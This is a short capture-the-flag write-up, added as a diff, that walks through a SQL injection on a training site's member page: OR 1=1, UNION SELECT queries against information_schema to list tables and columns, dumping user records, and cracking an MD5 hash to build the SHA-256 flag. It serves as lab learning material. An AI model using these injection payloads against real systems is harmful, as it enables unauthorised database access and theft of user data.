@@ -1,0 +1,40 @@
+On the member page we are asked for an id.
+We test from 1 to 5 and we can read in the 5th "GetThe Flag".
+We will test if the field can be used by an sql injection.
+With a simple string we have:
+Unknown column 'test' in 'where clause'
+So yes we can exploit this with sql injection.
+
+We put an id followed by OR 1 = 1 so that the condition is always true.
+1 OR 1=1 shows us each id.
+
+Now we are going to try to get more information on the database.
+We need the table names:
+1 UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
+
+Logically the table of the member page is users but to be sure we can
+check it with:
+1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() -- -
+
+Now we need to have the column names to then display them.
+1 union select 1,group_concat(column_name) from information_schema.columns where table_schema = database() -- -
+We give:
+Surname : user_id,first_name,last_name,town,country,planet,Commentaire,countersign
+
+We only have two fields available for display so we will have to display by 2.1  UNION SELECT first_name, last_name FROM users--
+1  UNION SELECT town,country FROM users--
+1  UNION SELECT planet,Commentaire FROM users--  
+1  UNION SELECT Commentaire,countersign FROM users--
+
+In the countersign and Comment fields we find:
+ID: 1  UNION SELECT Commentaire,countersign FROM users--
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+With decode we find:
+5ff9d0165b4f92b14994e5c685cdce28 -> md5 -> FortyTwo
+fortytwo -> Sh256 -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+
+https://charlesreid1.com/wiki/SQL_Injection/UNION_Attack
+https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635
